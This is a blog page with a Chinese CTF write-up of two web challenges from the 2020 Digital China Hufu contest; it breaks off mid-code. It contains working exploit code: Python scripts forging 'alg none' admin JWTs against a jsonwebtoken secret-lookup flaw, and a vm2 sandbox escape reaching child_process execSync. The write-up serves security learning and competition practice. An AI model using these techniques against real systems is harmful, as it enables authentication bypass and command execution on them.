@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    2020数字中国创新大道虎符网络安全赛道Web题解 |
+    
+    Mount4in</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Mount4in" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-2020数字中国创新大道虎符网络安全赛道Web题解" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2020数字中国创新大道虎符网络安全赛道Web题解
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/" class="article-date">
+  <time datetime="2020-04-19T08:37:15.000Z" itemprop="datePublished">2020-04-19</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        
+        <p>2020数字中国创新大道虎符网络安全赛道Web题解</p>
+<a id="more"></a>
+
+<h1 id="0x01-easy-login"><a href="#0x01-easy-login" class="headerlink" title="0x01 easy_login"></a>0x01 easy_login</h1><p>可以扫到源码，看到是Koa框架，然后搜了下框架相关的知识，<a href="https://blog.csdn.net/davidPan1234/article/details/83413958" target="_blank" rel="noopener">看到这篇</a></p>
+<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419192757519.png" alt="image-20200419192757519"></p>
+<p>然后访问可以得到源码。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//app.js</span></span><br><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'koa-bodyparser'</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'koa-session'</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> = <span class="built_in">require</span>(<span class="string">'koa-static'</span>);</span><br><span class="line"><span class="keyword">const</span> views = <span class="built_in">require</span>(<span class="string">'koa-views'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; resolve &#125; = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> rest = <span class="built_in">require</span>(<span class="string">'./rest'</span>);</span><br><span class="line"><span class="keyword">const</span> controller = <span class="built_in">require</span>(<span class="string">'./controller'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">80</span>;</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"></span><br><span class="line">app.keys = [crypto.randomBytes(<span class="number">16</span>).toString(<span class="string">'hex'</span>)];</span><br><span class="line">global.secrets = [];</span><br><span class="line"></span><br><span class="line">app.use(<span class="keyword">static</span>(resolve(__dirname, <span class="string">'.'</span>)));</span><br><span class="line"></span><br><span class="line">app.use(views(resolve(__dirname, <span class="string">'./views'</span>), &#123;</span><br><span class="line">  extension: <span class="string">'pug'</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.use(session(&#123;<span class="attr">key</span>: <span class="string">'sses:aok'</span>, <span class="attr">maxAge</span>: <span class="number">86400000</span>&#125;, app));</span><br><span class="line"></span><br><span class="line"><span class="comment">// parse request body:</span></span><br><span class="line">app.use(bodyParser());</span><br><span class="line"></span><br><span class="line"><span class="comment">// prepare restful service</span></span><br><span class="line">app.use(rest.restify());</span><br><span class="line"></span><br><span class="line"><span class="comment">// add controllers:</span></span><br><span class="line">app.use(controller());</span><br><span class="line"></span><br><span class="line">app.listen(PORT);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`app started at port <span class="subst">$&#123;PORT&#125;</span>...`</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//controller.js</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addMapping</span>(<span class="params">router, mapping</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> url <span class="keyword">in</span> mapping) &#123;</span><br><span class="line">        <span class="keyword">if</span> (url.startsWith(<span class="string">'GET '</span>)) &#123;</span><br><span class="line">            <span class="keyword">const</span> path = url.substring(<span class="number">4</span>);</span><br><span class="line">            router.get(path, mapping[url]);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (url.startsWith(<span class="string">'POST '</span>)) &#123;</span><br><span class="line">            <span class="keyword">const</span> path = url.substring(<span class="number">5</span>);</span><br><span class="line">            router.post(path, mapping[url]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`invalid URL: <span class="subst">$&#123;url&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addControllers</span>(<span class="params">router, dir</span>) </span>&#123;</span><br><span class="line">    fs.readdirSync(__dirname + <span class="string">'/'</span> + dir).filter(<span class="function"><span class="params">f</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> f.endsWith(<span class="string">'.js'</span>);</span><br><span class="line">    &#125;).forEach(<span class="function"><span class="params">f</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> mapping = <span class="built_in">require</span>(__dirname + <span class="string">'/'</span> + dir + <span class="string">'/'</span> + f);</span><br><span class="line">        addMapping(router, mapping);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">dir</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> controllers_dir = dir || <span class="string">'controllers'</span>;</span><br><span class="line">    <span class="keyword">const</span> router = <span class="built_in">require</span>(<span class="string">'koa-router'</span>)();</span><br><span class="line">    addControllers(router, controllers_dir);</span><br><span class="line">    <span class="keyword">return</span> router.routes();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//rest.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    APIError: <span class="function"><span class="keyword">function</span> (<span class="params">code, message</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.code = code || <span class="string">'internal:unknown_error'</span>;</span><br><span class="line">        <span class="keyword">this</span>.message = message || <span class="string">''</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    restify: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> pathPrefix = <span class="string">'/api/'</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (ctx.request.path.startsWith(pathPrefix)) &#123;</span><br><span class="line">                ctx.rest = <span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">                    ctx.response.type = <span class="string">'application/json'</span>;</span><br><span class="line">                    ctx.response.body = data;</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">await</span> next();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                    ctx.response.status = <span class="number">400</span>;</span><br><span class="line">                    ctx.response.type = <span class="string">'application/json'</span>;</span><br><span class="line">                    ctx.response.body = &#123;</span><br><span class="line">                        code: e.code || <span class="string">'internal_error'</span>,</span><br><span class="line">                        message: e.message || <span class="string">''</span></span><br><span class="line">                    &#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">await</span> next();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//controller/api.js</span></span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">'jsonwebtoken'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> APIError = <span class="built_in">require</span>(<span class="string">'../rest'</span>).APIError;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="string">'POST /api/register'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'register error'</span>, <span class="string">'wrong username'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(global.secrets.length &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">            global.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">'hex'</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = global.secrets.length;</span><br><span class="line">        global.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br><span class="line">        </span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line">    </span><br><span class="line">    <span class="string">'POST /api/login'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || !password) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'username or password is necessary'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">'.'</span>)[<span class="number">1</span>], <span class="string">'base64'</span>).toString()).secretid;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'no such secret id'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = global.secrets[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'GET /api/flag'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(ctx.session.username !== <span class="string">'admin'</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'permission error'</span>, <span class="string">'permission denied'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.readFileSync(<span class="string">'/flag'</span>).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'GET /api/logout'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = <span class="literal">null</span>;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>有注册和登录的功能，</p>
+<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419174209067.png" alt="image-20200419174209067"></p>
+<p>不可以注册admin，随机生成密钥，并将密钥按序保存到全局secrets数组中，利用jwt.sign来生成secretid, username, password的token。</p>
+<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419174551545.png" alt="image-20200419174551545"></p>
+<p>登录时先获取secretid值，然后在全局的secrets里面获取密钥，之后利用jwt.verify()解密。</p>
+<img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419175030662.png" alt="image-20200419175030662" style="zoom:150%;">
+
+<p>并且只有username为admin时才能得到flag。</p>
+<p>题目提示说：</p>
+<img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419173928204.png" alt="image-20200419173928204" style="zoom:150%;">
+
+<p>是依赖库有问题，然后看package.json</p>
+<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419174014185.png" alt="image-20200419174014185"></p>
+<p>然后从<a href="https://blog.csdn.net/a3320315/article/details/103092073" target="_blank" rel="noopener">这篇文章</a>里看到</p>
+<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419175440994.png" alt="image-20200419175440994"></p>
+<p>然后看本题登录时解token的密钥，</p>
+<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419181915396.png" alt="image-20200419181915396"></p>
+<p>首先是通过提取token中的secretid，然后判断sid是否合法。然后将取secrets[sid]作为jwt解密的密钥，若此处secret不存在，<code>jsonwebtoken</code>会采用<code>algorithm none</code>进行解密，然后我们就可以通过伪造jwt变成admin，然后就可以得到flag。</p>
+<p>然后回溯sid，当sid能够满足<code>sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0</code>而且secriets[sid]为空，那么当sid为0.1能够满足，之后即可伪造admin。</p>
+<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419193914408.png" alt="image-20200419193914408"></p>
+<p>解题步骤：</p>
+<ol>
+<li><p>先得到非admin的jwt，利用jet.io解密。</p>
+<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419193720626.png" alt="image-20200419193720626"></p>
+<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419194336137.png" alt="image-20200419194336137"></p>
+</li>
+<li><p>伪造jwt。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token = jwt.encode(&#123;</span><br><span class="line">  <span class="string">"secretid"</span>: <span class="number">0.1</span>,</span><br><span class="line">  <span class="string">"username"</span>: <span class="string">"admin"</span>,</span><br><span class="line">  <span class="string">"password"</span>: <span class="string">"dddd"</span>,</span><br><span class="line">  <span class="string">"iat"</span>: <span class="number">1587324387</span></span><br><span class="line">&#125;,algorithm=<span class="string">"none"</span>,key=<span class="string">""</span>).decode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ol>
+<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419195024687.png" alt="image-20200419195024687"></p>
+<ol start="3">
+<li><p>替换token登录。</p>
+<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419195111379.png" alt="image-20200419195111379"></p>
+</li>
+<li><p>修改cookie，访问/api/flag。</p>
+<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419195449455.png" alt="image-20200419195449455"></p>
+</li>
+</ol>
+<blockquote>
+<p>之后看来<a href="https://zhaoj.in" target="_blank" rel="noopener">赵总</a>的wp，他是用的将sid赋值为空数组，因为在javascript中，空数组与数字比较永远为真，下面是测试代码</p>
+<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200420163634128.png" alt="image-20200420163634128"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token = jwt.encode(&#123;</span><br><span class="line">  <span class="string">"secretid"</span>: [],</span><br><span class="line">  <span class="string">"username"</span>: <span class="string">"admin"</span>,</span><br><span class="line">  <span class="string">"password"</span>: <span class="string">"dddd"</span>,</span><br><span class="line">  <span class="string">"iat"</span>: <span class="number">1587324387</span></span><br><span class="line">&#125;,algorithm=<span class="string">"none"</span>,key=<span class="string">""</span>).decode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200420164707008.png" alt="image-20200420164707008"></p>
+</blockquote>
+<h1 id="0x02-just-escape"><a href="#0x02-just-escape" class="headerlink" title="0x02 just_escape"></a>0x02 just_escape</h1><p>这题是一道nodejs沙箱题，改的之前一个国外比赛的题，加了限制，过滤了单引号、双引号和一些关键字(child_process、execSync、prototype、constructor、process)。</p>
+<p>首先可以<a href="https://github.com/patriksimek/vm2/issues/225" target="_blank" rel="noopener">查到</a>，已经有表哥发了exp，然后就是对过滤的绕过了，</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">'('</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">""</span>)).a = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">		<span class="keyword">return</span> e.get_process(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString();</span><br><span class="line">	&#125;</span><br><span 